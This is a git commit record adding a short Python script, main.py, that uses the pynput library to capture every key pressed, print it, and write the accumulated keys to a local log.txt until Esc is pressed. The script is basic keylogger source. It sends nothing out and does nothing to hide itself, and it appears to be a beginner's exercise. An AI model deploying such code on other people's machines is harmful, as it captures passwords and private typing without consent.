e95485353e2d9522579a68ed9115236eebe1492d
ToxichQQQ <storozhenko.dev@gmail.com>
2022-03-10 01:34:54 +0300

    Initial commit

---
+++ main.py
@@ -0,0 +1,39 @@
+from asyncore import write
+from distutils.file_util import write_file
+import pynput 
+from pynput.keyboard import Key, Listener
+
+keys = []
+
+
+def on_press(key):
+
+    keys.append(key)
+    write_file(keys)
+
+    try:
+        print('Press key {0} pressed'.format(key.char))
+    except AttributeError:
+        print('Special key {0} passed' .format(key))
+
+
+def write_file(keys):
+    print(keys)
+    with open('log.txt','w') as f:
+        for k in keys:
+
+            k = str(k).replace("'","")
+            f.write(k)
+            f.write('       ------      ')
+
+def on_release(key):
+
+    print('{0} released'.format(key))
+    if key == Key.esc:
+        return False 
+
+
+with Listener(on_press = on_press,
+              on_release = on_release) as listener:
+                     
+    listener.join()
